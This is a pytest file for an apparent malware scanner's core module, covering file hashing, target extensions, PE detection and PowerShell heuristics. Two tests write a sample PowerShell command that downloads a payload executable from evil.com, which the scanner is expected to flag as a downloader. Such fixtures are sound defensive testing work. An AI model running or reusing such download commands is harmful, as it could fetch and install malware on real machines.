"""Tests para core/scanner.py"""

import os
import tempfile

from core.scanner import (
    TARGET_EXTENSIONS,
    analyze_binary_pe,
    analyze_heuristics,
    calculate_sha256,
)


def test_calculate_sha256_known():
    content = b"hello world"
    with tempfile.NamedTemporaryFile(delete=False, suffix=".bin") as f:
        f.write(content)
        path = f.name
    try:
        h = calculate_sha256(path)
        import hashlib

        assert h == hashlib.sha256(content).hexdigest()
    finally:
        os.unlink(path)


def test_calculate_sha256_empty_file():
    with tempfile.NamedTemporaryFile(delete=False, suffix=".bin") as f:
        path = f.name
    try:
        h = calculate_sha256(path)
        import hashlib

        assert h == hashlib.sha256(b"").hexdigest()
    finally:
        os.unlink(path)


def test_target_extensions():
    assert ".exe" in TARGET_EXTENSIONS
    assert ".dll" in TARGET_EXTENSIONS
    assert ".ps1" in TARGET_EXTENSIONS
    assert ".txt" not in TARGET_EXTENSIONS


def test_analyze_heuristics_ps_downloader():
    with tempfile.NamedTemporaryFile(delete=False, suffix=".ps1", mode="w", encoding="utf-8") as f:
        f.write("Invoke-WebRequest http://evil.com/payload.exe -OutFile x.exe\n")
        path = f.name
    try:
        rule_id, desc = analyze_heuristics(path)
        assert rule_id == "HEUR.PS.Downloader"
        assert "PowerShell" in desc or "Downloader" in desc
    finally:
        os.unlink(path)


def test_analyze_heuristics_clean_ps1():
    with tempfile.NamedTemporaryFile(delete=False, suffix=".ps1", mode="w", encoding="utf-8") as f:
        f.write("Write-Host 'hola mundo'\n")
        path = f.name
    try:
        rule_id, desc = analyze_heuristics(path)
        assert rule_id is None
        assert desc is None
    finally:
        os.unlink(path)


def test_analyze_heuristics_wrong_extension():
    with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8") as f:
        f.write("Invoke-WebRequest http://evil.com/x\n")
        path = f.name
    try:
        rule_id, desc = analyze_heuristics(path)
        assert rule_id is None
    finally:
        os.unlink(path)


def test_analyze_binary_pe_not_pe():
    with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as f:
        f.write(b"not a pe file")
        path = f.name
    try:
        rule_id, desc = analyze_binary_pe(path)
        assert rule_id is None
    finally:
        os.unlink(path)
